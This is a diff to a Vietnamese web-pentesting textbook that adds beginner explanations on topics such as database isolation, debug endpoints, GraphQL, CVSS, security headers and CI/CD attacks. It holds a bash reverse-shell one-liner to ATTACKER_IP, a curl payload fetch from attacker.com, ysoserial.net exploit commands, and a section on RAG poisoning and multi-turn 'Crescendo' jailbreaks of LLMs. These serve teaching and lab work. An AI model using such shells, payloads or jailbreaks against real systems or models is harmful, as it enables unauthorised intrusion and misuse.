+> **Gadget chain là gì?** Gadget chain là một CHUỖI các class/method có sẵn trong ứng dụng mà khi được kết nối lại (qua deserialization), sẽ thực thi code do attacker kiểm soát. Giống như **domino** — mỗi "gadget" là một quân domino, kết hợp lại tạo ra RCE. Tool bên dưới tự động tìm và tạo các chuỗi domino này.
 
 Tool tự động generate POP chain payloads cho các framework phổ biến:
 
@@ -19588,10 +19737,12 @@ Partial construction race conditions      │ Access user before
 Race conditions trong web apps GẦN NHƯ LUÔN liên quan đến database isolation!
 
 4 SQL isolation levels (yếu → mạnh):
-  READ UNCOMMITTED  → Dirty reads (đọc data chưa commit)
+  READ UNCOMMITTED  → Dirty reads (đọc data chưa commit — data có thể bị rollback!)
   READ COMMITTED    → No dirty reads, nhưng non-repeatable reads
+                      (đọc cùng row 2 lần → kết quả khác vì row bị TX khác update)
   REPEATABLE READ   → Consistent reads, nhưng phantom rows
-  SERIALIZABLE      → Full isolation (sequential execution)
+                      (query 2 lần → số rows khác vì có rows mới được INSERT)
+  SERIALIZABLE      → Full isolation (sequential execution — an toàn nhất, chậm nhất)
 
 Tại sao race condition xảy ra:
   MySQL default: REPEATABLE READ
@@ -19620,6 +19771,8 @@ Fix patterns:
      → App phải handle "serialization failure" error + retry
      
   4. Advisory locks (PostgreSQL):
+     (Advisory lock = application-level lock — không lock row hay table, 
+      chỉ là "cờ" mà app tự check. hashtext() tạo integer ID từ string.)
      SELECT pg_advisory_lock(hashtext('coupon:SAVE50:user:1'));
      -- apply coupon logic --
      SELECT pg_advisory_unlock(hashtext('coupon:SAVE50:user:1'));
@@ -20229,6 +20382,8 @@ Authentication bypass via encryption     │ Reuse encrypted cookie
 
 **Information disclosure** là khi ứng dụng vô tình tiết lộ thông tin nhạy cảm -- source code, credentials, internal structure, version numbers -- giúp attacker hiểu rõ hơn về target và tìm vulnerabilities khác.
 
+> **Tại sao quan trọng?** Thông tin bị lộ không phải là mục tiêu cuối cùng — nó là **BƯỚC ĐỆM**. Khi attacker biết server chạy Apache 2.4.41, họ tìm CVE cho CHÍNH phiên bản đó. Khi biết đường dẫn `/var/www/html/app/`, họ biết nơi upload webshell. Information disclosure là "trinh sát" trước khi tấn công thật.
+
 #### 30.1.1 Debug Pages
 
 ```
@@ -20253,6 +20408,8 @@ Common debug endpoints:
 ```
 
 **Werkzeug debugger (Python/Flask):**
+
+> **Werkzeug** (tiếng Đức = "công cụ") là thư viện WSGI (Web Server Gateway Interface) mà Flask xây dựng trên. Khi Flask chạy debug mode, Werkzeug cung cấp một **interactive Python console** tại `/console` — cho phép chạy BẤT KỲ code Python nào trên server.
 
 ```
 Khi Flask app chạy debug mode:
@@ -20434,6 +20591,8 @@ DEBUG = True  # ← THẢM HỌA trên production!
 
 **Spring Boot Actuator:**
 
+> **Spring Boot** là framework Java phổ biến nhất cho ứng dụng web doanh nghiệp. **Actuator** là module quản lý/giám sát tích hợp — nó expose các endpoint chứa thông tin nội bộ về ứng dụng (health, metrics, environment variables, heap dump).
+
 ```http
 # Spring Boot Actuator expose management endpoints
 # Mặc định có thể accessible KHÔNG cần authentication!
@@ -20583,6 +20742,8 @@ GET /nonexistent HTTP/1.1
 ---
 
 ### 30.3 .git Directory Exploitation
+
+> **Git là gì?** Git là hệ thống quản lý phiên bản mã nguồn — mỗi khi developer thay đổi code, Git lưu lại "snapshot" để có thể quay lại bất kỳ lúc nào. Khi developer deploy bằng `git clone` hoặc `git pull` lên server, thư mục `.git/` chứa **TOÀN BỘ lịch sử code** sẽ tồn tại trên server. Nếu web server không chặn truy cập `.git/`, attacker có thể tải về toàn bộ source code — bao gồm cả password, API key trong commit cũ.
 
 Nếu `.git/` directory accessible trên web server, attacker có thể reconstruct TOÀN BỘ source code.
 
@@ -21036,6 +21197,13 @@ Information disclosure in version        │ Access .git, /.svn
 #### JavaScript Source Maps (.js.map) — Đọc Original Source Code
 
 ```
+Tại sao có source maps? Code JavaScript production thường bị minified (nén bỏ 
+khoảng trắng, đổi tên biến thành a,b,c) + bundled (gộp nhiều files thành 1) bởi 
+webpack/vite → code trở nên unreadable. Source maps giúp developers debug trong 
+production bằng cách MAP ngược từ code nén → source code gốc.
+
+Vấn đề: nếu .map file bị public → attacker đọc TOÀN BỘ source code gốc!
+
 Production JavaScript thường minified/bundled (webpack, vite, etc.)
 Source maps (.js.map) MAP minified code → original source code!
 
@@ -21471,7 +21639,9 @@ Validation of file extension with          │ ../../../etc/passwd%00.jpg
 
 ### 32.1 Khái niệm
 
-**GraphQL** là query language cho APIs, cho phép client yêu cầu chính xác data cần thiết -- không thừa, không thiếu. Khác với REST (nhiều endpoints, fixed response), GraphQL có MỘT endpoint và client gửi query mô tả data cần lấy.
+**GraphQL** là query language (ngôn ngữ truy vấn) cho APIs — giống như SQL là ngôn ngữ truy vấn cho database, GraphQL là cách client "hỏi" server dữ liệu. Nó cho phép client yêu cầu chính xác data cần thiết -- không thừa, không thiếu. Khác với REST (nhiều endpoints, fixed response), GraphQL có MỘT endpoint và client gửi query mô tả data cần lấy.
+
+> **Kiến thức cần có:** Bạn cần hiểu REST API cơ bản (HTTP methods, endpoints, JSON response) trước khi học GraphQL.
 
 ```
 REST API:
@@ -21563,6 +21733,10 @@ Client Query
 **Introspection** -- GraphQL's built-in self-documentation:
 
 ```graphql
+# Introspection (tự kiểm tra) = tính năng ĐẶC BIỆT của GraphQL:
+# cho phép client hỏi server "bạn có những type và field nào?"
+# Giống hỏi database "SHOW TABLES" — nếu không tắt trên production,
+# attacker sẽ biết TOÀN BỘ cấu trúc API.
 # Full introspection query - reveals ENTIRE schema
 {
   __schema {
@@ -22233,7 +22407,7 @@ Server-side parameter pollution          │ Override params in REST
 > **Kiến thức cần có:** Hiểu HTTP, XSS, injection cơ bản
 > **PortSwigger Labs:** Web LLM attacks
 
-Các ứng dụng web ngày nay tích hợp Large Language Models (LLMs) vào nhiều chức năng: chatbot hỗ trợ khách hàng, code assistant, content generator, search summarizer, và document analyzer. Khi LLM được kết nối với internal APIs, databases, hoặc file systems, nó trở thành một **attack surface hoàn toàn mới** -- attacker có thể khai thác LLM để truy cập tài nguyên mà bình thường họ không thể chạm tới.
+LLM (Large Language Model — Mô hình Ngôn ngữ Lớn) là các hệ thống AI như ChatGPT, Claude, Gemini — được huấn luyện để hiểu và tạo ra văn bản tự nhiên. Các ứng dụng web ngày nay tích hợp LLMs vào nhiều chức năng: chatbot hỗ trợ khách hàng, code assistant, content generator, search summarizer, và document analyzer. Khi LLM được kết nối với internal APIs, databases, hoặc file systems, nó trở thành một **attack surface hoàn toàn mới** -- attacker có thể khai thác LLM để truy cập tài nguyên mà bình thường họ không thể chạm tới.
 
 ---
 
@@ -22897,8 +23071,14 @@ Indirect prompt injection                    │ Plant hidden instructions
 #### RAG Poisoning — Indirect Injection Qua Knowledge Base
 
 ```
-RAG (Retrieval-Augmented Generation):
+RAG (Retrieval-Augmented Generation) — cho phép LLM "học" từ documents riêng:
   User query → Embed → Vector DB search → Retrieve top-K docs → LLM generates answer
+  
+  Giải thích từng bước cho newbie:
+  (1) Embed = chuyển câu hỏi thành vector số (dãy số đại diện ý nghĩa ngữ cảnh)
+  (2) Vector DB = database đặc biệt lưu vectors, tìm documents "gần nghĩa" nhất
+  (3) top-K = K documents liên quan nhất (thường K=3-5)
+  (4) LLM đọc documents + câu hỏi → generate câu trả lời
 
 Attack: Poison documents TRONG knowledge base!
 
@@ -22930,8 +23110,8 @@ Impact:
 #### Multi-Turn Prompt Injection — Crescendo Attack
 
 ```
-Single-turn injection often blocked by safety filters.
-Multi-turn: gradually escalate qua nhiều messages!
+Single-turn injection (inject 1 lần) thường bị safety filters chặn.
+Multi-turn: từ từ escalate qua nhiều messages liên tiếp!
 
 Crescendo Attack Pattern:
   Turn 1: "What are the most common cybersecurity threats?"
@@ -23007,6 +23187,8 @@ Kiến thức lý thuyết sẽ vô dụng nếu không biết cách áp dụng.
 ---
 
 ## Chương 34: Methodology - Quy Trình Test Hoàn Chỉnh
+
+**Penetration test (kiểm thử xâm nhập)** là quá trình MÔ PHỎNG tấn công vào hệ thống VỚI SỰ CHO PHÉP của chủ sở hữu, nhằm tìm lỗ hổng trước khi attacker thật tìm thấy. Khác với bug bounty (tìm tự do, ai tìm được thì báo), pentest có **phạm vi (scope)**, **thời gian**, và **báo cáo chính thức**.
 
 Khi bạn bước vào một buổi penetration test thực sự, bạn không thể "random" thử payload rồi mong có lỗi. Chuyên gia thực sự làm việc theo quy trình -- giống như bác sĩ khám bệnh: hỏi bệnh sử, khám lâm sàng, xét nghiệm, chẩn đoán, điều trị. Mỗi bước xây trên kết quả của bước trước.
 
@@ -23689,6 +23871,12 @@ thông tin người dùng, password hash, và dữ liệu tài chính.
 
 ### Mức độ nghiêm trọng
 CVSS 3.1: 9.8 (Critical)
+
+> **CVSS là gì?** CVSS (Common Vulnerability Scoring System) là hệ thống chấm điểm lỗ hổng từ 0.0 đến 10.0:
+> - 0.0–3.9 = **Low** (thấp) | 4.0–6.9 = **Medium** (trung bình)
+> - 7.0–8.9 = **High** (cao) | 9.0–10.0 = **Critical** (nghiêm trọng)
+> Điểm 9.8 nghĩa là lỗ hổng này gần như nguy hiểm nhất có thể.
+
 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
 
 ### Bước tái hiện
@@ -24937,10 +25125,14 @@ server {
 │    └── IDE security plugins (SonarLint, Snyk)                    │
 ├──────────────────────────────────────────────────────────────────┤
 │ 3. TESTING                                                       │
-│    ├── SAST: SonarQube, Semgrep, CodeQL (scan source code)       │
-│    ├── DAST: OWASP ZAP, Burp Suite (scan running app)            │
-│    ├── SCA: Snyk, Dependabot (scan dependencies)                 │
-│    ├── IAST: Contrast Security (agent trong runtime)             │
+│    ├── SAST (Static): scan source code KHÔNG cần chạy ứng dụng  │
+│    │   → SonarQube, Semgrep, CodeQL                              │
+│    ├── DAST (Dynamic): scan ứng dụng ĐANG CHẠY từ bên ngoài     │
+│    │   → OWASP ZAP, Burp Suite                                  │
+│    ├── SCA (Software Composition Analysis): kiểm tra thư viện    │
+│    │   có CVE → Snyk, Dependabot                                 │
+│    ├── IAST (Interactive): agent chạy BÊN TRONG ứng dụng để     │
+│    │   theo dõi runtime → Contrast Security                      │
 │    └── Manual penetration testing                                │
 ├──────────────────────────────────────────────────────────────────┤
 │ 4. DEPLOYMENT                                                    │
@@ -26006,6 +26198,8 @@ curl http://attacker.com/payload -o /tmp/payload
 
 ### C.7 Reverse Shell One-Liners
 
+> **CẢNH BÁO PHÁP LÝ:** Chỉ sử dụng reverse shell trong **môi trường lab** hoặc khi đã có **SỰ CHO PHÉP BẰNG VĂN BẢN** từ chủ hệ thống. Sử dụng trái phép là **PHẠM PHÁP** ở hầu hết các quốc gia, kể cả Việt Nam (Điều 289 Bộ luật Hình sự — tội xâm nhập trái phép vào mạng máy tính). Các lệnh bên dưới cực kỳ nguy hiểm — hãy chỉ dùng cho mục đích học tập và kiểm thử hợp pháp.
+
 ```bash
 # ═══ Bash ═══
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
@@ -26403,6 +26597,12 @@ server {
 
 ### E.4 CSP Directive Reference
 
+> **Bắt đầu từ đâu?** Nếu bạn mới học CSP, tập trung vào 4 directive quan trọng nhất:
+> 1. `default-src 'self'` — chặn tất cả external resources
+> 2. `script-src 'self'` — chặn XSS từ external scripts
+> 3. `frame-ancestors 'none'` — chặn clickjacking
+> 4. `base-uri 'self'` — chặn base tag injection
+
 ```
 Directive                │ Mô tả                                     │ Ví dụ
 ─────────────────────────┼────────────────────────────────────────────┼────────────────────────
@@ -26515,6 +26715,8 @@ Permissions-Policy:
 ```
 
 ### E.7 Cross-Origin Headers: COOP, COEP, CORP
+
+> **[NÂNG CAO]** Phần này dành cho developer cần hiểu cross-origin isolation (cách ly giữa các origin để chống Spectre-class attacks). Nếu bạn mới bắt đầu, hãy tập trung vào CSP, HSTS, X-Frame-Options, và X-Content-Type-Options trước — quay lại phần này khi đã vững.
 
 ```
 # ═══ Cross-Origin-Opener-Policy (COOP) ═══
@@ -26782,6 +26984,8 @@ curl -sI http://example.com
 ---
 
 ## Phụ lục F: Python Script Templates
+
+> **Yêu cầu:** Python 3.7+ | Cài đặt thư viện: `pip install requests beautifulsoup4` | Tất cả script sử dụng CLI — chạy từ terminal/command prompt: `python3 script.py [args]`
 
 ### F.1 Blind SQLi Binary Search Bruter
 
@@ -27406,6 +27610,8 @@ if __name__ == '__main__':
 
 Kế hoạch này được thiết kế cho người học dành 1-2 giờ/ngày, 5 ngày/tuần. Mỗi giai đoạn bao gồm lý thuyết, thực hành lab, và ôn tập.
 
+> **Lưu ý thực tế:** Thời gian trên là LÝ TƯỞNG. Lab Practitioner có thể mất 1–3 giờ MỖI lab đối với người mới. Đừng lo nếu bạn chậm hơn kế hoạch — quan trọng là **HIỂU**, không phải chạy cho nhanh. Nhiều pentester giỏi mất 6–12 tháng để hoàn thành tất cả labs.
+
 ---
 
 **Tuần 1-2: Foundation & Setup**
@@ -27798,6 +28004,8 @@ Kỹ thuật: Business logic analysis, cache key analysis, unkeyed input detecti
 
 ## Chương 39: .NET Deserialization — Mảnh Ghép Bị Thiếu
 
+> **Tiên quyết:** Đọc Chương 24 (Insecure Deserialization) trước. Chương này MỞ RỘNG khái niệm deserialization sang thế giới .NET — nếu bạn đã hiểu PHP serialize()/unserialize() và Java ObjectInputStream từ Ch24, .NET là một "dialect" khác cùng pattern: attacker control serialized data → server tái tạo object → magic methods trigger → RCE.
+
 ### 39.1 Tại sao quan trọng?
 
 .NET deserialization là một trong những attack surface phổ biến nhất trong enterprise:
@@ -27830,6 +28038,8 @@ Nếu ViewState CÓ MAC nhưng bạn biết machineKey:
 ```
 # Tạo payload cho BinaryFormatter
 ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64
+# -g = gadget chain (chuỗi class để exploit), -f = formatter (kiểu serialize)
+# -c = command (lệnh OS cần chạy), -o = output format (base64/raw/hex)
 
 # Tạo ViewState payload (cần machineKey)
 ysoserial.net -p ViewState -g TextFormattingRunProperties \
@@ -28284,6 +28494,13 @@ Escaped form: \2a \28 \29 \5c \00
 
 ### 45.1 Cross-Origin Isolation
 
+> **Context cho newbie:** Spectre/Meltdown (2018) là lỗ hổng PHẦN CỨNG CPU cho phép process đọc memory của process khác. Trong browser, một tab malicious có thể đọc memory của tab khác → lộ cookies, passwords. Ba header dưới đây là response của browser vendors để cách ly memory giữa các origins.
+
+> **Dễ nhầm vì tên giống nhau — phân biệt:**
+> - **COOP** (Cross-Origin Opener Policy): Ai có thể MỞ CỬA SỔ của tôi? (popup/opener relationship)
+> - **COEP** (Cross-Origin Embedder Policy): Tôi EMBED resources từ đâu? (subresource loading)
+> - **CORP** (Cross-Origin Resource Policy): Ai ĐƯỢC EMBED tôi? (ngược lại — tôi cho phép ai load tôi)
+
 ```
 Sau Spectre/Meltdown, browsers cần cách ly memory giữa origins.
 SharedArrayBuffer (high-resolution timer) bị disable trừ khi page
@@ -28341,6 +28558,8 @@ Bypass attempts:
 
 ### 46.1 Dependency Confusion
 
+> **Context cho newbie:** Package managers (npm cho JavaScript, pip cho Python, Maven cho Java) download thư viện từ registries (npm registry, PyPI, Maven Central). Doanh nghiệp thường có private registry chứa internal packages. Vấn đề: khi install, package manager CÓ THỂ tìm ở CẢ HAI registries — public VÀ private. Nếu cùng tên package tồn tại ở cả hai, ai thắng?
+
 ```
 Attack: Đăng ký package public với tên TRÙNG internal private package.
 Build system prioritize public registry → download attacker's package → RCE
@@ -28363,6 +28582,9 @@ Prevention:
 Attack vectors:
 1. Poisoned pull request → CI runs attacker's code
    - GitHub Actions: pull_request_target + checkout PR code = RCE
+     (pull_request_target = trigger chạy workflow với QUYỀN CỦA BASE BRANCH,
+      thường main. Nếu workflow checkout code từ PR untrusted nhưng chạy với
+      quyền write → attacker submit PR chứa malicious code → RCE với admin access)
    - Branch protection bypass → direct push to main
 
 2. Secret exfiltration from CI environment
